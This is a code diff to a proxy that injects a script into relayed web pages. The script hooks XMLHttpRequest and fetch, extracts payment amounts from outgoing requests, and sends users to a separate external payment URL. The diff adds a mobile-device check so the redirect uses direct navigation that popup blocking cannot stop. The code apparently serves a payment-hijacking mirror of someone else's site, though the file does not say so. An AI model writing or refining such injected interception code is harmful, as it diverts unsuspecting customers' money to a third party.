@@ -410,6 +410,45 @@ const proxyOptions = {
   const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
   console.log('[Payment Redirect] LOW-LEVEL interceptor initialized');
   
+  // Detect mobile device
+  function isMobileDevice() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
+           (window.innerWidth <= 768 && window.innerHeight <= 1024) ||
+           ('ontouchstart' in window) ||
+           (navigator.maxTouchPoints > 0);
+  }
+  
+  const isMobile = isMobileDevice();
+  console.log('[Payment Redirect] Device type:', isMobile ? 'MOBILE' : 'DESKTOP');
+  
+  // Function to redirect to payment system (works on both mobile and desktop)
+  function redirectToPayment(amount) {
+    const paymentUrl = PAYMENT_URL + '?amount=' + amount;
+    console.log('[Payment Redirect] Redirecting to:', paymentUrl);
+    
+    if (isMobile) {
+      // MOBILE: Use direct navigation (window.location.href)
+      // This is more reliable on mobile devices than window.open()
+      console.log('[Payment Redirect] Using direct navigation for mobile device');
+      window.location.href = paymentUrl;
+    } else {
+      // DESKTOP: Use window.open() to open in new tab
+      console.log('[Payment Redirect] Using window.open() for desktop device');
+      const paymentWindow = window.open(paymentUrl, '_blank');
+      
+      if (paymentWindow) {
+        console.log('[Payment Redirect] Payment window opened successfully');
+        return true;
+      } else {
+        console.warn('[Payment Redirect] window.open() failed, falling back to direct navigation');
+        // Fallback: if popup is blocked, use direct navigation
+        window.location.href = paymentUrl;
+        return true;
+      }
+    }
+    return true;
+  }
+  
   // Store original methods
   const originalXHROpen = XMLHttpRequest.prototype.open;
   const originalXHRSend = XMLHttpRequest.prototype.send;
@@ -531,19 +570,16 @@ const proxyOptions = {
         if (amount && parseFloat(amount) > 0) {
           console.log('[Payment Redirect] Redirecting with dynamic amount:', amount);
           
-          // Open payment system in new tab (silently, no alerts)
-          const paymentWindow = window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
-          
-          if (paymentWindow) {
-            console.log('[Payment Redirect] Payment window opened successfully');
+          // Redirect to payment system (handles mobile/desktop automatically)
+          if (redirectToPayment(amount)) {
             // CRITICAL: Reset flag after successful redirect to allow future attempts
-            // Use timeout to ensure payment window is fully opened
+            // Use timeout to ensure redirect is processed
             setTimeout(function() {
               redirectInProgress = false;
               console.log('[Payment Redirect] Flag reset - ready for next payment attempt');
-            }, 2000); // Reset after 2 seconds
+            }, isMobile ? 1000 : 2000); // Shorter timeout for mobile (direct navigation)
           } else {
-            console.error('[Payment Redirect] Failed to open payment window (popup blocked?)');
+            console.error('[Payment Redirect] Failed to redirect');
             redirectInProgress = false;
             lastPaymentAmount = null; // Reset on failure
           }
@@ -598,13 +634,13 @@ const proxyOptions = {
           const amount = bodyAmountMatch && bodyAmountMatch[1] ? bodyAmountMatch[1] : extractAmount();
           
           if (amount && parseFloat(amount) > 0) {
-            const paymentWindow = window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
-            if (paymentWindow) {
+            // Redirect to payment system (handles mobile/desktop automatically)
+            if (redirectToPayment(amount)) {
               // Reset flag after successful redirect
               setTimeout(function() {
                 redirectInProgress = false;
                 console.log('[Payment Redirect] Flag reset (Fetch) - ready for next payment attempt');
-              }, 2000);
+              }, isMobile ? 1000 : 2000); // Shorter timeout for mobile (direct navigation)
             } else {
               redirectInProgress = false;
             }
